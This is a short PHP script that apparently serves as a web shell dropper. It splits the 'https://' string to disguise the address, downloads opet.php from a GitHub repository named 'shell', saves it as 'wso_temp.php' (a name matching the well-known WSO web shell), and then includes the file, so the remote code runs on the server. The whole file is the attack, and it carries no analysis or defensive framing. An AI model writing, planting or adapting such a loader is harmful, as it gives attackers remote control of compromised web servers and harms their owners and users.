<?php
$awo = 'htt'.'ps://';
$url = $awo.'raw.githubusercontent.com/Dzbackdor/shell/master/opet.php';
$local_file = 'wso_temp.php';

function download_content($url, $local_file) {
    $content = file_get_contents($url);
    if ($content !== false) {
        file_put_contents($local_file, $content);
    } else {
        die("Failed to download the content.");
    }
}

if (!file_exists($local_file) || filesize($local_file) === 0) {
    // Attempt to download content if file does not exist or is empty
    if (file_exists($local_file)) {
        unlink($local_file); // Delete the file if it exists and is empty
    }
    download_content($url, $local_file);
}

include $local_file;
?>
